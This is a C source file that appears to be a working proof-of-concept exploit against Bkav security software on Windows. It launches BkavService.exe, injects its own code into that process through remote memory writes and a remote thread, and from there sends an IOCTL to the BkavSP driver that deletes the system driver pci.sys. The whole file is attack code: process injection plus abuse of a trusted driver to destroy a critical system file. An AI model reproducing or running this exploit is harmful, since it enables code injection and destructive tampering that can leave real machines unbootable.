#pragma warning(disable: 4005)

#include <windows.h>
#include <strsafe.h>
#include <ntstatus.h>
#include "ntos.h"

#if defined (_MSC_VER)
#if (_MSC_VER >= 1900)
#ifdef _DEBUG
#pragma comment(lib, "vcruntimed.lib")
#pragma comment(lib, "ucrtd.lib")
#else
#pragma comment(lib, "libucrt.lib")
#pragma comment(lib, "libvcruntime.lib")
#endif
#endif
#endif

typedef NTSTATUS(NTAPI* pfnNtDeviceIoControlFile)(
    _In_ HANDLE FileHandle,
    _In_opt_ HANDLE Event,
    _In_opt_ PIO_APC_ROUTINE ApcRoutine,
    _In_opt_ PVOID ApcContext,
    _Out_ PIO_STATUS_BLOCK IoStatusBlock,
    _In_ ULONG IoControlCode,
    _In_reads_bytes_opt_(InputBufferLength) PVOID InputBuffer,
    _In_ ULONG InputBufferLength,
    _Out_writes_bytes_opt_(OutputBufferLength) PVOID OutputBuffer,
    _In_ ULONG OutputBufferLength);

typedef int (WINAPI* pfnMessageBoxA)(
    _In_opt_ HWND hWnd,
    _In_opt_ LPCSTR lpText,
    _In_opt_ LPCSTR lpCaption,
    _In_ UINT uType);

typedef HANDLE(WINAPI* pfnCreateFileA)(
    _In_ LPCSTR lpFileName,
    _In_ DWORD dwDesiredAccess,
    _In_ DWORD dwShareMode,
    _In_opt_ LPSECURITY_ATTRIBUTES lpSecurityAttributes,
    _In_ DWORD dwCreationDisposition,
    _In_ DWORD dwFlagsAndAttributes,
    _In_opt_ HANDLE hTemplateFile);

typedef NTSTATUS(NTAPI* pfnRtlExitUserThread)(
    _In_ NTSTATUS ExitStatus);

typedef int(__cdecl* psprintf_s)(
    char* buffer,
    size_t sizeOfBuffer,
    const char* format,
    ...);

typedef struct tagLOAD_PARAMETERS {
    CHAR szDeviceName[100];
    CHAR szMessage[100];
    WCHAR szFileToDelete[MAX_PATH];
    pfnNtDeviceIoControlFile NtDeviceIoControlFile;
    pfnCreateFileA CreateFileA;
    pfnRtlExitUserThread RtlExitUserThread;
    pfnMessageBoxA MessageBoxA;
    psprintf_s sprintf_s;
} LOAD_PARAMETERS, * PLOAD_PARAMETERS;

LOAD_PARAMETERS g_LoadParameters;

#include "minirtl\minirtl.h"

HANDLE NTAPI supRunProcessAsInvoker(
    _In_ LPWSTR lpszParameters,
    _In_opt_ LPWSTR lpCurrentDirectory,
    _In_opt_ LPWSTR lpApplicationName,
    _Out_opt_ HANDLE* PrimaryThread
)
{
    BOOL bResult = FALSE;
    LPWSTR pszBuffer = NULL;
    SIZE_T ccb;
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    DWORD dwFlags = CREATE_DEFAULT_ERROR_MODE | NORMAL_PRIORITY_CLASS | CREATE_UNICODE_ENVIRONMENT;
    PVOID pEnvironment;
    UNICODE_STRING valueName, valueData;

    if (PrimaryThread)
        *PrimaryThread = NULL;

    if (lpszParameters == NULL)
        return NULL;

    ccb = (1 + _strlen(lpszParameters)) * sizeof(WCHAR);
    pszBuffer = (LPWSTR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, ccb);
    if (pszBuffer == NULL)
        return NULL;

    _strcpy(pszBuffer, lpszParameters);

    RtlSecureZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
    RtlSecureZeroMemory(&si, sizeof(STARTUPINFO));
    si.cb = sizeof(STARTUPINFO);
    GetStartupInfo(&si);

    if (NT_SUCCESS(RtlCreateEnvironment(TRUE, &pEnvironment))) {

        RtlInitUnicodeString(&valueName, L"__COMPAT_LAYER");
        RtlInitUnicodeString(&valueData, L"RUNASINVOKER");

        if (NT_SUCCESS(RtlSetEnvironmentVariable(&pEnvironment,
            &valueName, &valueData)))
        {
            bResult = CreateProcess(
                lpApplicationName,
                pszBuffer,
                NULL,
                NULL,
                FALSE,
                dwFlags | CREATE_SUSPENDED,
                pEnvironment,
                lpCurrentDirectory,
                &si,
                &pi);

            if (bResult) {
                if (PrimaryThread) {
                    *PrimaryThread = pi.hThread;
                }
                else {
                    CloseHandle(pi.hThread);
                }
            }
        }

        RtlDestroyEnvironment(pEnvironment);
    }
    HeapFree(GetProcessHeap(), 0, pszBuffer);
    return pi.hProcess;
}

DWORD WINAPI ShellProc(
    _In_ LOAD_PARAMETERS* Params
)
{
    IO_STATUS_BLOCK ioStatus;
    CHAR Buffer[1024];

    CHAR szFailed[] = { 'F', 'a', 'i', 'l', 'e', 'd', 0 };
    CHAR szSuccess[] = { 'S', 'u', 'c', 'c', 'e', 's', 's', 0 };
    CHAR szTemp[] = { '%', 'l', 'x', 0 };


    HANDLE deviceHandle = Params->CreateFileA(Params->szDeviceName,
        GENERIC_READ | GENERIC_WRITE,
        0,
        NULL,
        OPEN_EXISTING,
        0,
        NULL);

    if (deviceHandle != INVALID_HANDLE_VALUE) {

        Params->MessageBoxA(0, Params->szMessage, szSuccess, 0);
    
        NTSTATUS status = Params->NtDeviceIoControlFile(deviceHandle,
            NULL,
            NULL,
            NULL,
            &ioStatus,
            0x22E141,
            &Params->szFileToDelete,
            MAX_PATH * sizeof(WCHAR),
            NULL,
            0);

        if (NT_SUCCESS(status))
        {
            Params->MessageBoxA(0, szSuccess, szSuccess, 0);
        }
        else {
            Params->sprintf_s(Buffer, 200, szTemp, status);
            Params->MessageBoxA(0, Buffer, szFailed, 0);
        }

    }
    else {
        Params->MessageBoxA(0, szFailed, NULL, 0);
    }

    return Params->RtlExitUserThread(0);
}


int main()
{
    HINSTANCE hKernel = GetModuleHandle(TEXT("kernel32.dll"));
    HINSTANCE hNtdll = GetModuleHandle(TEXT("ntdll.dll"));
    LPVOID    RemoteCode = NULL, newEp, newDp;

    HINSTANCE InjectorImageBase = GetModuleHandle(NULL);
    PIMAGE_NT_HEADERS NtHeaders = RtlImageNtHeader(InjectorImageBase);

    PLOAD_PARAMETERS LoadParams = &g_LoadParameters;
    PVOID LoadProc = ShellProc;
    HANDLE hProcess;

    _strcpy_a(LoadParams->szDeviceName, "\\\\.\\BkavSP");
    _strcpy_a(LoadParams->szMessage, "Device BkavSP opened\r\n");
    _strcpy(LoadParams->szFileToDelete, L"C:\\windows\\system32\\drivers\\pci.sys");

    LoadParams->CreateFileA = (pfnCreateFileA)GetProcAddress(hKernel, "CreateFileA");

    LoadParams->NtDeviceIoControlFile = (pfnNtDeviceIoControlFile)GetProcAddress(hNtdll, "NtDeviceIoControlFile");
    LoadParams->RtlExitUserThread = (pfnRtlExitUserThread)GetProcAddress(hNtdll, "RtlExitUserThread");
    LoadParams->sprintf_s = (psprintf_s)GetProcAddress(hNtdll, "sprintf_s");

    LoadParams->MessageBoxA = (pfnMessageBoxA)GetProcAddress(GetModuleHandle(L"user32.dll"), "MessageBoxA");


    hProcess = supRunProcessAsInvoker((LPWSTR)L"C:\\Windows\\system32\\BkavService.exe", NULL, NULL, NULL);
    if (hProcess == NULL) {
        MessageBox(GetDesktopWindow(), L"Could not start target process", NULL, 0);
        return -1;
    }

    SIZE_T memIO = (SIZE_T)NtHeaders->OptionalHeader.SizeOfImage;
    NTSTATUS ntStatus;

    ntStatus = NtAllocateVirtualMemory(
        hProcess,
        &RemoteCode,
        0,
        &memIO,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE);

    if (!NT_SUCCESS(ntStatus)) {
        MessageBox(GetDesktopWindow(), L"NtAllocateVirtualMemory error", NULL, 0);
        return -2;
    }

    memIO = (SIZE_T)NtHeaders->OptionalHeader.SizeOfImage;

    ntStatus = NtWriteVirtualMemory(
        hProcess,
        RemoteCode,
        InjectorImageBase,
        memIO,
        &memIO);

    if (!NT_SUCCESS(ntStatus)) {
        MessageBox(GetDesktopWindow(), L"NtWriteVirtualMemory error", NULL, 0);
        return -3;
    }

    newEp = (char*)RemoteCode + ((char*)LoadProc - (char*)InjectorImageBase);
    newDp = (char*)RemoteCode + ((char*)LoadParams - (char*)InjectorImageBase);

    HANDLE hRemoteThread;

    ntStatus = RtlCreateUserThread(
        hProcess,
        NULL,
        FALSE,
        0,
        0,
        0,
        (PUSER_THREAD_START_ROUTINE)newEp,
        newDp,
        &hRemoteThread,
        NULL);

    if (!NT_SUCCESS(ntStatus)) {
        MessageBox(GetDesktopWindow(), L"RtlCreateUserThread error", NULL, 0);
        return -4;
    }

    if (hRemoteThread) {
        WaitForSingleObject(hRemoteThread, INFINITE);
        NtClose(hRemoteThread);
    }

    if (hProcess) {
        TerminateProcess(hProcess, 0);
        CloseHandle(hProcess);
    }

    return 0;
}
